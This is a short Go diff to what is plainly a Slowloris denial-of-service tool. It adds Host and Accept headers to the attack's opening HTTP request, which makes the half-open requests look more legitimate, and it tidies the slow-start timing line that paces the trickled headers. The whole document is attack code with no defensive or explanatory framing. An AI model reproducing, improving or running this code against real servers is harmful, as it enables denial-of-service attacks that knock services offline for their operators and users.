@@ -113,7 +113,15 @@ func (s *Slowloris) initAttack(conn io.Writer) error {
 		return fmt.Errorf("write HTTP start line: %w", err)
 	}
 
+	if err := writeHTTPHeaderTo(conn, "Host", s.Target.Url.Host); err != nil {
+		return fmt.Errorf("write HTTP header: %w", err)
+	}
+
 	if err := writeHTTPHeaderTo(conn, "User-Agent", s.UserAgents[s.randn(len(s.UserAgents))]); err != nil {
+		return fmt.Errorf("write HTTP header: %w", err)
+	}
+
+	if err := writeHTTPHeaderTo(conn, "Accept", "*/*"); err != nil {
 		return fmt.Errorf("write HTTP header: %w", err)
 	}
 
@@ -157,7 +165,7 @@ func (s *Slowloris) worker(ctx context.Context, eventHandler EventHandler) error
 		} else {
 			// slow start 50 ~ 100ms to make sure slow http server like python -mhttp.server
 			// can handle it
-			slowStartInterval := time.Duration(s.randn(50) + 50) * time.Millisecond
+			slowStartInterval := time.Duration(s.randn(50)+50) * time.Millisecond
 			interval := nextInterval + slowStartInterval
 			gibberishTimer = time.NewTimer(interval)
 		}
